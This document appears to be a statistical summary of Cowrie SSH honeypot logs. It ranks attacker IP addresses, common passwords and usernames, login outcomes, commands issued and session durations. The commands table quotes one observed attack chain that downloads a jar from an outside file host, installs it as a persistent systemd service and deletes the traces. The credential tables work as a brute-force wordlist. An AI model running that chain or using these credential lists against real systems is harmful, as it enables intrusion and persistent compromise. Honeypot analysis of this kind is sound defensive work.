# General Analysis

## Most Common IPs

| IP               | Repetitions |
|------------------|-------------|
| 51.75.45.185     | 115,611     |
| 123.127.10.217   | 12,392      |
| 146.190.96.229   | 11,181      |
| 143.198.159.112  | 4,394       |
| 116.110.27.124   | 3,975       |
| 159.203.12.13    | 3,582       |
| 193.201.9.104    | 2,937       |
| 165.232.166.202  | 2,888       |
| 170.64.187.77    | 2,568       |
| 170.64.211.168   | 2,568       |
| 212.70.149.150   | 2,483       |
| 85.209.11.227    | 2,406       |
| 170.64.147.11    | 2,322       |
| 170.64.232.238   | 2,322       |
| 170.64.236.52    | 2,322       |
| 6170.64.236.66   | 2,322       |

## Most Common Passwords

| Password    | Repetitions |
|-------------|-------------|
| 123456      | 2,431       |
| admin       | 1,443       |
| 1234        | 1,212       |
| broadguam1  | 988         |
| password    | 827         |
| root        | 807         |
| 12345       | 670         |
| 123         | 523         |
| 1           | 367         |
| user        | 363         |

## Most Common Usernames

| Username    | Repetitions |
|-------------|-------------|
| root        | 39,123      |
| admin       | 6,341       |
| user        | 858         |
| guest       | 772         |
| ubnt        | 717         |
| default     | 608         |
| oracle      | 561         |
| support     | 448         |
| test        | 438         |
| supervisor  | 427         |

## Most Common Pairs

| Password-Username     | Repetitions |
|-----------------------|-------------|
| broadguam1-root       | 988         |
| admin-admin           | 659         |
| root-root             | 658         |
| admin-root            | 468         |
| 1234-admin            | 360         |
| 123456-admin          | 278         |
| 1234-root             | 267         |
| 123456-root           | 263         |
| password-admin        | 242         |
| admin1234-admin       | 236         |

## Login Attempts

- **Success (cowrie.login.success):** 37,910 (55.8%)
- **Failed (cowrie.login.falied):** 30,073 (44.2%)

## Most Common Commands
* overall 3,346 logs with commands 

| Command | Count |
|---------|-------|
| uname -s -v -n -r -m | 600 |
| sh | 254 |
| shell | 253 |
| enable | 249 |
| system | 248 |
| wget https://download.oracle.com/java/21/latest/jdk-21_linux-x64_bin.deb && curl -sSL -o Stream.jar https://www.zippyshare.day/download/Ee1rqDBD1Rb7F5n/EQN9mEYX4m6dW/Stream.jar && chmod +x Stream.jar && sudo cp Stream.jar /etc/ && sudo dpkg -i jdk-21_linux-x64_bin.deb && curl -sSL -o streamer.service https://www.zippyshare.day/download/XxGCIBDG6UnYsBw/DM2BGwwJkGj40/streamer.service && sudo cp streamer.service /etc/systemd/system/ && sudo systemctl enable streamer.service && rm Stream.jar && rm streamer.service && rm jdk-21_linux-x64_bin.deb && java -jar /etc/Stream.jar | 181 |
| /bin/busybox cat /proc/self/exe || cat /proc/self/exe | 178 |
| kill %%1 | 143 |
| ping;sh | 143 |
| uname -a | 75 |



## Session Durations

### Top 3 longest sessions

| Duration | count | 
|---------|-------|
| 201.97 sec | 1 |
| 191.43 sec | 1 |
| 189.75 sec | 1 |

### Top 3 shortest sessions

| Duration | count | 
|---------|-------|
| 0.0002592  sec | 1 |
| 0.0002639 sec | 1 |
| 0.0002703 sec | 1 |

- Average duration **7.3686 sec.**
- Count cowrie.session.closed = **67,645**
